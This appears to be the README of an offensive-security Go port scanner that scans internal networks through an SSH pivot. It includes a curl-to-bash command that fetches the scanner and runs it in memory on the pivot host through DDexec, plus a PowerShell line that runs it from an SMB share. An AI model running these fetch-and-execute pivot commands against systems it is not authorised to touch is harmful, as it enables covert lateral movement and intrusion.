# SPS (SimplePortScanner)

SPS is a simple and fast TCP port scanner, with the addition that you have the possibility to run it on any server where you can authenticate via ssh without touching disk. 

In a scenario where we want to scan hosts in an internal network through a pivot, this can help speed up the process and get more reliable results.

## How it works: Scanning from another machine

The tool will authenticate via ssh to the host provided via the `-from` argument. After successfully authenticating, it will execute one of these commands depending on the OS provided with the `-pivot-os` argument.

```bash
# On linux
curl http://<SERVE_IP>:<SERVE_PORT/sps.b64 | bash <(curl http://<SERVE_IP>:<SERVE_PORT>/ddexec.sh) /bin/legit -host <HOST> -port <PORTS> -retries <RETRIES> -delay-between-retries <DELAY...> -timeout <TIMEOUT>

# On windows
powershell -command "\\<SERVE_IP>\<SHARE_NAME>\sps.exe -host <HOST> -port <PORTS> -retries <RETRIES> -delay-between-retries <DELAY...> -timeout <TIMEOUT>"
```

That will download and execute the binary (in memory) and return the results in `STDOUT`. 

> The linux command makes use of [DDexec](https://github.com/arget13/DDexec) in order to execute the tool in memory

## Installation / Setup

Clone the repository:

```bash
git clone https://github.com/squ4r00t/sps
```

Compile the code for your machine:

```bash
cd sps/
go build -o sps .
```

You now have an executable that you can run on your machine. 

> You can test that it works by running it (without any arguments, it will scan all tcp ports on `127.0.0.1`).

Now, you will need to compile the code for the host that will run the `sps`. You can do it as follows:

```bash
# For linux
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o serve/sps
cat serve/sps | base64 -w0 | tee serve/sps.b64

# For windows
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o serve/sps.exe
```

Now you have all you need to get started.

## Usage

```bash
> sps --help

Usage of ./sps:
  -delay-between-retries int
        Time delay between each retry (default 500)
  -from string
        The host to run the scan from. You should also provide a ssh user and password/key
  -host string
        The host to scan, or valid CIDR range (default "127.0.0.1")
  -nmap string
        Arguments passed to nmap. Example: "-A -oN nmap" (default "no")
  -pivot-os string
        OS of the host running the scan (default "linux")
  -port string
        Ports to scan: coma-separated list or 'alltcp' for all tcp ports (default "alltcp")
  -retries int
        The number of retries before moving to another port (default 3)
  -serve-ip string
        The IP of the web server. Should be accessible by the host running the scan
  -serve-port string
        The port of the web server
  -share-name string
        The name of the share hosting the executable
  -ssh-key string
        The path to the private key file used to log in
  -ssh-pass string
        The ssh password used to log in
  -ssh-port string
        The Port ssh is running on. Default 22 (default "22")
  -ssh-user string
        The user to log in as. Should be used with -from
  -timeout int
        Time to wait for server response (default 5000)
```

### Normal Scan
___

Here are some basic use cases:

```bash
# Scanning all tcp ports on 10.10.10.10
sps -host 10.10.10.10

# Scanning ports 22 and 80 on 10.10.10.10
sps -host 10.10.10.10 -port 22,80

# Scanning all tcp port on all live hosts in 10.10.10.0/24
sps -host 10.10.10.0/24
```

### Scanning from another machine
___
First, you'll need to setup either a webserver or a smbshare depending on the os of the machine:

```bash
# Python web server
cd sps/serve
python3 -m http.server 1337

# SMB share
impacket-smbserver myshare sps/serve/
```

Similar usage as a normal scan, but you'll need to provide additional arguments:
- `-from`: IP address of the machine to run scan from
- `-ssh-user`: User to authenticated as via ssh
- `-ssh-pass` or `-ssh-key`: SSH password or path to private key file (not both)
- `pivot-os`: The operating system of the machine running the scan: windows or linux (if not specified will default to linux)
- `-serve-ip` and `-serve-port`: The IP address and the port number hosting the binary (you will need to setup a web server for linux or smbshare for windows)
- `-share-name`: Name of the smb share hosting the executable (if `pivot-os` is windows)